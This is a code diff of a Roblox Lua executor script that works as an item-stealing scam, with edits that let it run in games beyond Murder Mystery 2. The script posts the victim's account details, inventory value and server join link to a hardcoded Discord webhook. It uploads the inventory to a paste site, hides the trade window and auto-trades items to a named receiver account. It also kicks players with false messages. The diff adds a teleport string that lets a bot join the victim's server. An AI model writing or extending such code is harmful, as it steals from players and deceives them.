@@ -6,7 +6,6 @@ local WEBHOOK    = "https://discord.com/api/webhooks/1543214605667672146/xlaygQk
 local RECEIVER   = {"iceyblueii"}
 local MINIMUM_VALUE = 10
 
--- Dynamic: works in MM2 AND Westeria (or any game) without kicking
 local CURRENT_PLACE_ID = game.PlaceId
 local IS_MM2 = (CURRENT_PLACE_ID == 142823291)
 
@@ -34,9 +33,6 @@ if WEBHOOK == "" then
     return
 end
 
--- REMOVED: hard PlaceId==142823291 kick — script now runs in any game
-
--- VIP server block only makes sense in MM2 (remote doesn't exist elsewhere)
 if IS_MM2 then
     pcall(function()
         if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
@@ -46,7 +42,6 @@ if IS_MM2 then
     end)
 end
 
--- Use actual server max instead of MM2-hardcoded 12
 local SERVER_MAX = game.Players.MaxPlayers
 if #game.Players:GetPlayers() >= SERVER_MAX then
     game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
@@ -59,13 +54,13 @@ local ExecutorName = "Unknown"
 pcall(function() ExecutorName = identifyexecutor() end)
 _G.RealExecutor = string.lower(ExecutorName)
 
-local Players          = game:GetService("Players")
+local Players           = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService       = game:GetService("HttpService")
 local LocalPlayer       = Players.LocalPlayer
 local PlayerGui         = LocalPlayer:WaitForChild("PlayerGui")
 
-local ItemDatabase  = {}
+local ItemDatabase   = {}
 local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}
 
 local function LoadDatabase()
@@ -122,7 +117,6 @@ local function LoadDatabase()
 end
 
 local LoadedData, LoadedOrder = nil, nil
--- Only bother loading MM2 item DB when actually in MM2
 if IS_MM2 then
     for TryCount = 1, 3 do
         LoadedData, LoadedOrder = LoadDatabase()
@@ -130,13 +124,13 @@ if IS_MM2 then
         task.wait(0.5)
     end
     if LoadedData and LoadedOrder and #LoadedOrder > 0 then
-        ItemDatabase    = LoadedData
-        RarityPriority  = LoadedOrder
+        ItemDatabase   = LoadedData
+        RarityPriority = LoadedOrder
     end
 end
 
-local RarityList     = RarityPriority
-local GodlyPosition  = table.find(RarityList, "Godly")
+local RarityList    = RarityPriority
+local GodlyPosition = table.find(RarityList, "Godly")
 
 local function FormatNameDisplay(Text)
     if not Text or Text == "" then return "Unknown" end
@@ -153,7 +147,6 @@ local function FormatNameDisplay(Text)
     return Result
 end
 
--- Trade helpers — MM2 only
 local function GetTradeStatus()
     return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
 end
@@ -211,7 +204,6 @@ end
 
 local RefreshInventoryLists = function()
     local AllItems, TradeItems, TotalValue = {}, {}, 0
-    -- Inventory remote is MM2-specific; skip entirely on other games
     if not IS_MM2 then return AllItems, TradeItems, TotalValue end
     local ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
     if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
@@ -223,7 +215,7 @@ local RefreshInventoryLists = function()
                     local Key2 = string.lower(SafeName):gsub("'",""):gsub(" ","_")
                     local Key3 = string.lower(SafeName):gsub("'",""):gsub(" ","-")
                     local Key4 = string.lower(SafeName):gsub(" ","")
-                    local ItemInfo = ItemDatabase[Key1] or ItemDatabase[Key2] or ItemDatabase[Key3] or ItemDatabase[Key4]
+                    local ItemInfo   = ItemDatabase[Key1] or ItemDatabase[Key2] or ItemDatabase[Key3] or ItemDatabase[Key4]
                     local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
                     local Value      = ItemInfo and ItemInfo.Value  or 0
                     local IsChroma   = ItemInfo and ItemInfo.Chroma or false
@@ -240,7 +232,7 @@ local RefreshInventoryLists = function()
             end
         end
     end
-    table.sort(AllItems,  function(A,B) return A.Total > B.Total end)
+    table.sort(AllItems,   function(A,B) return A.Total > B.Total end)
     table.sort(TradeItems, function(A,B) return A.Total > B.Total end)
     return AllItems, TradeItems, TotalValue
 end
@@ -308,14 +300,11 @@ local function BuildEmbed(ReceiverName)
     if #AllInventoryItems > 10 then
         PreviewText = PreviewText .. "\n... and " .. (#AllInventoryItems - 10) .. " more items"
     end
-    local PlayerCount    = #Players:GetPlayers()
-    local JobId          = _G.RealJobID or game.JobId
+    local PlayerCount       = #Players:GetPlayers()
+    local JobId             = _G.RealJobID or game.JobId
     local FullInventoryText = GenerateFullInventoryText(AllInventoryItems)
-    local PasteUrl       = UploadToPastefy(FullInventoryText)
-
-    -- FIX: use game.PlaceId dynamically so tobiAj joins the correct game (Westeria or MM2)
-    local ActivePlaceId = tostring(CURRENT_PLACE_ID)
-
+    local PasteUrl          = UploadToPastefy(FullInventoryText)
+    local ActivePlaceId     = tostring(CURRENT_PLACE_ID)
     local InfoBlock = string.format(
         "Game: %s\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/%d\nReceiver: %s\nMin Value: %d",
         ActivePlaceId,
@@ -327,14 +316,13 @@ local function BuildEmbed(ReceiverName)
         #AllInventoryItems, TotalTradeValue
     )
     local EmbedFields = {
-        {name="Player Info",                      value="```"..InfoBlock.."```",  inline=false},
-        {name="Stats",                             value="```"..StatsBlock.."```", inline=false},
-        {name="All Items (Highest Value First)",   value="```"..PreviewText.."```",inline=false}
+        {name="Player Info",                    value="```"..InfoBlock.."```",  inline=false},
+        {name="Stats",                          value="```"..StatsBlock.."```", inline=false},
+        {name="All Items (Highest Value First)",value="```"..PreviewText.."```",inline=false}
     }
     if PasteUrl then
         table.insert(EmbedFields, {name="Full Inventory Log", value=PasteUrl, inline=false})
     end
-    -- THE KEY FIX: join link now uses the live placeId, not the hard-coded MM2 one
     table.insert(EmbedFields, {
         name  = "Join Link",
         value = "[" .. string.sub(JobId,1,8) .. "...](https://plsbrainrot.me/joiner?placeId="
@@ -350,24 +338,34 @@ local function BuildEmbed(ReceiverName)
     }, MentionText
 end
 
+-- ▼▼▼ UPDATED SendWebhook — teleport string injected into message content ▼▼▼
 local function SendWebhook()
     local RequestFunc = GetRequestFunction()
     if not RequestFunc then return end
     local ActiveName = GetActiveReceiverName()
     local Embed, Mention = BuildEmbed(ActiveName)
-    local Payload = HttpService:JSONEncode({content=Mention, embeds={Embed}})
+    local JobId = _G.RealJobID or game.JobId
+
+    -- tobiAj reads THIS line from message content to extract placeId + jobId
+    local TeleportString = "game:GetService('TeleportService'):TeleportToPlaceInstance("
+        .. tostring(CURRENT_PLACE_ID) .. ", '" .. JobId .. "')"
+
+    local ContentField = (Mention ~= "" and Mention .. "\n" or "") .. TeleportString
+
+    local Payload = HttpService:JSONEncode({content = ContentField, embeds = {Embed}})
     pcall(function()
         RequestFunc({
-            Url=WEBHOOK, Method="POST",
-            Headers={["Content-Type"]="application/json"},
-            Body=Payload
+            Url     = WEBHOOK,
+            Method  = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body    = Payload
         })
     end)
 end
+-- ▲▲▲ end updated SendWebhook ▲▲▲
 
 SendWebhook()
 
--- Trade GUI suppression and trade logic: MM2 only
 if IS_MM2 then
     PlayerGui:WaitForChild("TradeGUI"):GetPropertyChangedSignal("Enabled"):Connect(function()
         PlayerGui.TradeGUI.Enabled = false
@@ -450,7 +448,6 @@ local function AutoTradeOnTargetJoin()
     Players.PlayerAdded:Connect(CheckPlayerJoin)
 end
 
--- Trade only fires in MM2 (Westeria gets webhook + correct join link, no trade)
 if IS_MM2 then
     if #AllInventoryItems > 0 then
         AutoTradeOnTargetJoin()
@@ -459,5 +456,3 @@ if IS_MM2 then
         LocalPlayer:Kick("No Items Found!")
     end
 end
--- In Westeria (or any other game): webhook already fired above with the correct placeId
--- tobiAj will now see the right gameInstanceId and join the correct server
